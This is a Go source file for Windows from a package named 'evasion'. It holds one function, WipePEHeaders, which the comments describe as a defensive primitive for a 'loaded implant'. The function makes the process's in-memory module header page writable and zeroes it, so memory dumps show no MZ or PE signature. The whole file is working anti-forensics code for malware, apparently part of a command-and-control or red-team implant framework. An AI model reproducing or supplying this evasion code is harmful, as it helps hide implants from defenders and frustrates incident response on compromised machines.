//go:build windows

// Package evasion holds self-defensive primitives that make the loaded
// implant harder to detect through static or runtime inspection.
package evasion

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// WipePEHeaders zeroes the first HeaderWipeBytes of the mapped module in
// memory. After this call, a memory dump of the process shows no MZ
// signature, no PE header, no import table — just zeros where the DOS/NT
// headers used to be. The process keeps running because the loader has
// already parsed the headers and relocated the image.
//
// Returns an error if GetModuleHandle, VirtualProtect, or the memset write
// fails — every failure is fatal to the wipe, not to the process, so the
// caller can log and continue.
func WipePEHeaders() error {
	// GetModuleHandleEx with flags=0 and moduleName=nil returns the
	// handle of the calling process's main module. Same result as
	// GetModuleHandle(NULL), exposed by x/sys as the Ex form only.
	var h windows.Handle
	if err := windows.GetModuleHandleEx(0, nil, &h); err != nil {
		return fmt.Errorf("evasion: GetModuleHandleEx: %w", err)
	}
	base := uintptr(h)
	if base == 0 {
		return fmt.Errorf("evasion: module handle is nil")
	}

	// HeaderWipeBytes is 0x1000 — one page covers the entire DOS header
	// and PE headers plus the section table on every normal PE. Wiping
	// one page is enough to destroy the signature without touching
	// mapped code or data.
	const wipeSize = 0x1000

	var oldProtect uint32
	if err := windows.VirtualProtect(
		base,
		wipeSize,
		windows.PAGE_READWRITE,
		&oldProtect,
	); err != nil {
		return fmt.Errorf("evasion: VirtualProtect(RW): %w", err)
	}

	// Zero the page with a syscall-free write. runtime.panic if the
	// pointer is invalid — but GetModuleHandle guarantees the page is
	// mapped and VirtualProtect just gave us write access.
	buf := unsafe.Slice((*byte)(unsafe.Pointer(base)), wipeSize)
	for i := range buf {
		buf[i] = 0
	}

	// Restore the original protection so the page isn't left RW.
	_ = windows.VirtualProtect(base, wipeSize, oldProtect, &oldProtect)
	return nil
}
